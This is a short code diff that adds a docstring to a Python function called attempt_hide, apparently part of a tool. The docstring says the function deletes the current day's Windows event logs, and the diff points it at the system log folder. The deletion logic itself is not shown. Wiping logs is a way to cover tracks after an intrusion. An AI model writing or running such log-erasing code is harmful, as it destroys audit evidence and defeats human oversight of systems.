@@ -4,6 +4,15 @@ import os
 
 
 def attempt_hide():
+    """
+    Attempts to delete Windows event logs from the current day.
+
+    Parameters:
+    None
+
+    Returns:
+    None
+    """
     today = datetime.date.today()
     log_path = r'C:\Windows\System32\winevt\Logs'
 
